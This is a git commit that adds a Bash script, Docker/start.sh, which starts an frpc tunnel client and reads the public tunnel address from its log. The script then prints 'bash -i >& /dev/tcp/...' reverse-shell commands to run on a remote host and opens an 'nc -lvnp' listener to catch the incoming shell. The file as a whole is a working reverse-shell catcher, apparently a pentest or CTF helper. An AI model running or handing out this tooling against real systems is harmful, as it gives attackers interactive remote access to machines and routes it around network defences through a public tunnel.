35cce73a63da41849d2f15a42539aa5a686b0198
探姬 <41804496+ProbiusOfficial@users.noreply.github.com>
2024-04-17 03:17:51 +0800

    Remove unnecessary files and code

---
+++ Docker/start.sh
@@ -0,0 +1,70 @@
+#!/bin/bash
+
+# 如果未提供环境变量，退出
+if [ -z "$FRPC_KEY_ID" ]; then
+    echo "Error: FRPC_KEY_ID environment variable is not set"
+    exit 1
+fi
+
+LOGFILE="frpc_start.log"
+
+# 后台启动 frpc，并将输出重定向到临时文件
+./frpc -f $FRPC_KEY_ID &>> "$LOGFILE" &
+echo "Waiting for frpc to start..." | tee -a "$LOGFILE"
+sleep 4
+
+
+# 检查日志文件内容
+logFile="frpc_start.log"
+
+if [ -s "$logFile" ]; then
+    echo "FRPC log has been updated."
+else
+    echo "FRPC log is still empty."
+fi
+
+# 从日志文件中读取内容
+logContent=$(cat "$logFile")
+
+# 解析隧道信息
+tunnelInfoPattern="Use \[(.+?):([0-9]+)\] to connect."
+ipInfoPattern="Or connect by IP \(not recommended\): \[(.+?):([0-9]+)\]"
+
+if [[ $logContent =~ $tunnelInfoPattern ]]; then
+    tunnelDomain="${BASH_REMATCH[1]}"
+    tunnelPort="${BASH_REMATCH[2]}"
+    echo "[OK] Tunnel Domain: $tunnelDomain, Tunnel Port: $tunnelPort"
+else
+    echo "Error: Tunnel information not found."
+fi
+
+if [[ $logContent =~ $ipInfoPattern ]]; then
+    tunnelIP="${BASH_REMATCH[1]}"
+    echo "[OK] Tunnel IP: $tunnelIP, Tunnel Port: $tunnelPort"
+else
+    echo "Error: IP information not found."
+fi
+# 解析本地端口
+localPortPattern=" tcp -> 127\.0\.0\.1:([0-9]+)\]"
+
+if [[ $logContent =~ $localPortPattern ]]; then
+    localPort="${BASH_REMATCH[1]}"
+    echo "Local Port: $localPort"
+else
+    echo "Error: Local port not found."
+fi
+
+# 输出连接指令
+if [[ -n "$tunnelDomain" && -n "$tunnelIP" && -n "$tunnelPort" ]]; then
+    bashCommand1="bash -i >& /dev/tcp/$tunnelDomain/$tunnelPort 0>&1"
+    bashCommand2="bash -i >& /dev/tcp/$tunnelIP/$tunnelPort 0>&1"
+    echo "[OK] Use either of these commands on your remote host to get a shell:"
+    echo $bashCommand1
+    echo $bashCommand2
+fi
+
+# 启动 nc 监听本地端口
+if [[ -n "$localPort" ]]; then
+    nc -lvnp $localPort
+fi
+
